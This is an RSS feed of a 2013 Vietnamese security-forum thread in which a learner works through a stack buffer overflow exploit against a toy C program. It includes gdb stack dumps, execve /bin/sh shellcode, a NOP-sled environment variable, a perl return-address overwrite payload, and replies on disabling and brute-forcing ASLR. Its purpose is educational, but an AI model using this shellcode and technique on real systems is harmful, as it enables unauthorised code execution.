@@ -1,0 +1,256 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Hỏi về buffer overflow"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/8.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Hỏi về buffer overflow"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Hỏi về buffer overflow</title>
+				<description><![CDATA[ Chào mọi người, em có vài điều muốn hỏi về stack-based buffer overflow:
+
+Em có 1 chương trình như sau:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void foo&#40;char *mes&#41;
+{
+	char buf&#91;20&#93;;
+
+	strcpy&#40;buf, mes&#41;;
+}
+
+int main&#40;int argc, char **argv&#41;
+{
+	if &#40;argc != 2&#41; {
+		printf&#40;"Usage: %s &lt;string&gt;\n&quot;, argv&#91;0&#93;&#41;;
+		exit&#40;1&#41;;
+	}
+
+	foo&#40;argv&#91;1&#93;&#41;;
+
+	return 0;
+}</pre>
+		</div>
+
+Compile: 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>gcc -z execstack -fno-stack-protector -Wall -g overflow.c -o overflow</pre>
+		</div>
+
+strcpy ở chương trình trên sẽ gây ra buffer overflow. Em thử khai thác:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#40;gdb&#41; disass main
+Dump of assembler code for function main:
+   0x08048496 &lt;+0&gt;:	push   ebp
+   0x08048497 &lt;+1&gt;:	mov    ebp,esp
+   0x08048499 &lt;+3&gt;:	and    esp,0xfffffff0
+   0x0804849c &lt;+6&gt;:	sub    esp,0x10
+   0x0804849f &lt;+9&gt;:	cmp    DWORD PTR &#91;ebp+0x8&#93;,0x2
+   0x080484a3 &lt;+13&gt;:	je     0x80484c6 &lt;main+48&gt;
+   0x080484a5 &lt;+15&gt;:	mov    eax,DWORD PTR &#91;ebp+0xc&#93;
+   0x080484a8 &lt;+18&gt;:	mov    eax,DWORD PTR &#91;eax&#93;
+   0x080484aa &lt;+20&gt;:	mov    DWORD PTR &#91;esp+0x4&#93;,eax
+   0x080484ae &lt;+24&gt;:	mov    DWORD PTR &#91;esp&#93;,0x8048570
+   0x080484b5 &lt;+31&gt;:	call   0x8048330 &lt;printf@plt&gt;
+   0x080484ba &lt;+36&gt;:	mov    DWORD PTR &#91;esp&#93;,0x1
+   0x080484c1 &lt;+43&gt;:	call   0x8048360 &lt;exit@plt&gt;
+   0x080484c6 &lt;+48&gt;:	mov    eax,DWORD PTR &#91;ebp+0xc&#93;
+   0x080484c9 &lt;+51&gt;:	add    eax,0x4
+   0x080484cc &lt;+54&gt;:	mov    eax,DWORD PTR &#91;eax&#93;
+   0x080484ce &lt;+56&gt;:	mov    DWORD PTR &#91;esp&#93;,eax
+   0x080484d1 &lt;+59&gt;:	call   0x804847c &lt;foo&gt;
+   0x080484d6 &lt;+64&gt;:	mov    eax,0x0
+   0x080484db &lt;+69&gt;:	leave  
+   0x080484dc &lt;+70&gt;:	ret    
+End of assembler dump.</pre>
+		</div>
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#40;gdb&#41; break 10
+Breakpoint 1 at 0x8048494: file overflow.c, line 10.
+&#40;gdb&#41; run AAAA
+Starting program: /home/quan/bt/btc/shellcode/overflow AAAA
+
+Breakpoint 1, foo &#40;mes=0xbffff427 &quot;AAAA&quot;&#41; at overflow.c:10
+10	}
+&#40;gdb&#41; i r esp ebp
+esp            0xbffff160	0xbffff160
+ebp            0xbffff198	0xbffff198
+&#40;gdb&#41; x/20xw $esp
+0xbffff160:	0xbffff17c	0xbffff427	0xbffff402	0xb7fc0000
+0xbffff170:	0x080484e0	0x08048380	0x00000000	0x41414141
+0xbffff180:	0xb7fc0300	0x00000002	0x0804a000	0x08048532
+0xbffff190:	0x00000002	0xbffff254	0xbffff1b8	0x080484d6
+0xbffff1a0:	0xbffff427	0x00000000	0x080484eb	0xb7fc0000
+&#40;gdb&#41; cont
+Continuing.
+&#91;Inferior 1 &#40;process 3161&#41; exited normally&#93;</pre>
+		</div>
+
+Như vậy có thể thấy vị trí của return address là 0xbffff19c, vị trí của buf là 0xbffff17c. Ta sẽ cần 36 bytes để overwrite return address. Em dự định sẽ đặt shellcode vào 1 biến env là EGG cùng với 200 bytes NOP sled.
+
+
+Đây là đoạn mã assembly em dùng làm shellcode:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>BITS 32
+
+; execve&#40;const char *filename, char *const argv&#91;&#93;, char *const envp&#91;&#93;&#41;
+xor eax, eax
+push eax
+push 0x68732f2f		; Push &quot;//sh&quot; to the stack. 
+push 0x6e69622f		; Push &quot;/bin&quot; to the stack.
+mov ebx, esp
+push eax
+mov ecx, esp
+push eax
+mov edx, esp
+mov al, 11
+int 0x80</pre>
+		</div>
+
+Bây giờ em tìm địa chỉ của biến EGG:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>quan@quantran:~/bt/btc/shellcode$ nasm shell.s
+quan@quantran:~/bt/btc/shellcode$ export EGG=$&#40;perl -e 'print &quot;\x90&quot;x200'&#41;$&#40;cat shell&#41;
+quan@quantran:~/bt/btc/shellcode$ gdb -q ./overflow
+Reading symbols from /home/quan/bt/btc/shellcode/overflow...done.
+&#40;gdb&#41; break main
+Breakpoint 1 at 0x804849f: file overflow.c, line 14.
+&#40;gdb&#41; run
+Starting program: /home/quan/bt/btc/shellcode/overflow 
+
+Breakpoint 1, main &#40;argc=1, argv=0xbffff174&#41; at overflow.c:14
+14		if &#40;argc != 2&#41; {
+&#40;gdb&#41; x/30s $esp + 0x260
+...
+0xbffff4f1:	&quot;EGG=&quot;, '\220' &lt;repeats 196 times&gt;...
+0xbffff5b9:	"\220\220\220\220\061\300Ph//shh/bin\211\343P\211\341P\211\342\260\v̀"
+...
+&#40;gdb&#41; cont
+Continuing.
+Usage: /home/quan/bt/btc/shellcode/overflow &lt;string&gt;
+&#91;Inferior 1 &#40;process 3729&#41; exited with code 01&#93;
+&#40;gdb&#41; quit
+quan@quantran:~/bt/btc/shellcode$</pre>
+		</div>
+
+Ta có thể thấy biến EGG nằm ở 0xbffff4f1. Khi chạy chương trình có thể địa chỉ sẽ khác đi 1 chút, tuy nhiên em nghĩ với 200 bytes NOP sled thì sẽ không vấn đề gì. Như vậy em sẽ dùng địa chỉ 0xbffff550 để overwrite return address.
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>quan@quantran:~/bt/btc/shellcode$ ./overflow $&#40;perl -e 'print "\x90"x32 . "\x50\xf5\xff\xbf"'&#41;
+Segmentation fault &#40;core dumped&#41;
+quan@quantran:~/bt/btc/shellcode$ gdb -q ./overflow
+Reading symbols from /home/quan/bt/btc/shellcode/overflow...done.
+&#40;gdb&#41; run $&#40;perl -e 'print "\x90"x32 . "\x50\xf5\xff\xbf"'&#41;
+Starting program: /home/quan/bt/btc/shellcode/overflow $&#40;perl -e 'print "\x90"x32 . "\x50\xf5\xff\xbf"'&#41;
+process 3810 is executing new program: /bin/dash
+$ ls
+Makefile  aa.c	helloworld  helloworld.s  overflow  overflow.c	shell  shell.s	test  test.c
+$ 
+&#91;Inferior 1 &#40;process 3810&#41; exited normally&#93;
+&#40;gdb&#41; quit
+quan@quantran:~/bt/btc/shellcode$ ./overflow $&#40;perl -e 'print "\x90"x32 . "\x50\xf5\xff\xbf"'&#41;
+Segmentation fault &#40;core dumped&#41;</pre>
+		</div>
+
+Khi chạy ở ngoài thì bị segfault, tuy nhiên khi chạy ở gdb thì lại được??? Tại sao lại thế ạ? Liệu các biến môi trường có bị disable theo 1 cách nào đó không khi chương trình chạy ở ngoài? Sự khác biệt giữa chạy trong gdb với chạy ở ngoài là gì ạ?
+
+Em cảm ơn trước ạ :)
+
+P/s: Em vừa ngồi thử lại xong và bây giờ thì cả trong gdb cũng bị segfault. Pro Police đã bị disable, stack thì executable, shellcode đúng, vậy thì tại sao lại bị segfault ạ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279179</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279179</link>
+				<pubDate><![CDATA[Fri, 6 Dec 2013 05:46:47]]> GMT</pubDate>
+				<author><![CDATA[ qwerty13]]></author>
+			</item>
+			<item>
+				<title>Hỏi về buffer overflow</title>
+				<description><![CDATA[ gdb hình như không bật ASLR thì phải...]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279182</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279182</link>
+				<pubDate><![CDATA[Fri, 6 Dec 2013 19:20:53]]> GMT</pubDate>
+				<author><![CDATA[ StarGhost]]></author>
+			</item>
+			<item>
+				<title>Hỏi về buffer overflow</title>
+				<description><![CDATA[ @StarGhost: Lần đầu tiên em nghe đến ASLR trong gdb :) sau khi bật lên thì đúng là địa chỉ của biến EGG có khác đi, tuy nhiên mỗi lần 1 khác. Em cũng có 1 chương trình để tìm địa chỉ biến môi trường theo tên biến và tên chương trình:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main&#40;int argc, char *argv&#91;&#93;&#41; 
+{
+        char *ptr;
+
+        if&#40;argc &lt; 3&#41; {
+                printf&#40;&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv&#91;0&#93;&#41;;
+                exit&#40;0&#41;;
+        }
+
+        ptr = getenv&#40;argv&#91;1&#93;&#41;;                           /* Get env var location. */
+        ptr += &#40;strlen&#40;argv&#91;0&#93;&#41; - strlen&#40;argv&#91;2&#93;&#41;&#41;*2;    /* Adjust for program name. */
+
+        printf&#40;"%s will be at %p\n", argv&#91;1&#93;, ptr&#41;;
+
+        return 0;
+}</pre>
+		</div>
+
+Tuy nhiên mỗi lần chạy thì kết quả lại khác nhau. Có phải đây là do ASLR của linux không ạ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279186</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279186</link>
+				<pubDate><![CDATA[Sat, 7 Dec 2013 04:58:09]]> GMT</pubDate>
+				<author><![CDATA[ qwerty13]]></author>
+			</item>
+			<item>
+				<title>Hỏi về buffer overflow</title>
+				<description><![CDATA[ Mình không rõ thực sự bạn muốn hỏi điều gì nữa :( 
+
+Lỗi trên bạn không khai thác được ở &quot;bên ngoài&quot; là do hệ điều hành của bạn đang bật chế độ bảo vệ ASLR (cái này bạn có thể xem tại<span class="link"> http://en.wikipedia.org/wiki/Address_space_layout_randomization</span>). 
+
+Nếu để phục vụ nhu cầu học tập tìm hiểu về các lỗi thì bạn cần Disable ASLR bằng cách dùng lệnh 
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># echo 0 &gt; /proc/sys/kernel/randomize_va_space</pre>
+		</div>
+Còn trong thực tế tế để khai thác lỗi này thì bạn phải bypass được các cơ chế bảo vệ của HĐH (ASLR, DEP ...)
+Một vài ví dụ bypass: 
+-<span class="link"> http://www.vnsecurity.net/2013/05/secuinside-ctf-2013-pwnme-writeup</span>
+- Sơ lược về ROP để bypass DEP/ASLR<span class="link"> http://libamboo.so/forum/topic/26/</span>
+
+- Ky0 - ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279196</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279196</link>
+				<pubDate><![CDATA[Sun, 8 Dec 2013 22:50:50]]> GMT</pubDate>
+				<author><![CDATA[ Ky0]]></author>
+			</item>
+			<item>
+				<title>Hỏi về buffer overflow</title>
+				<description><![CDATA[ @KyO: À em hỏi có phải địa chỉ của biến env mỗi lần 1 khác là do ALSR của linux không thì đúng là thế ạ. Em đã cho stack executable, disable Pro Police mà quên mất ALSR. Cảm ơn anh ạ.
+
+À quên cho em hỏi, giá trị default của /proc/sys/kernel/randomize_va_space là 2 đúng k ạ? Em chỉnh về 0, bây giờ cho về 2 mà khi thử tìm địa chỉ biến môi trường thì có vẻ hơi lạ: 0xbfbb65e4, 0xbfeb25e4, 0xbf8fd5e4,... tức là 3 số cuối giống nhau ấy ạ, mà lúc trước thì không như thế. Em nghĩ là do base của stack dịch chuyển nhưng 3 số cuối vẫn giống nhau?
+
+P/s: Em thử brute force đúng 1 địa chỉ 1000 lần, đến lần thứ 600 thì được với NOP sled 20000 bytes.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279197</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45339.hva#279197</link>
+				<pubDate><![CDATA[Mon, 9 Dec 2013 02:29:54]]> GMT</pubDate>
+				<author><![CDATA[ qwerty13]]></author>
+			</item>
+	</channel>
+</rss>
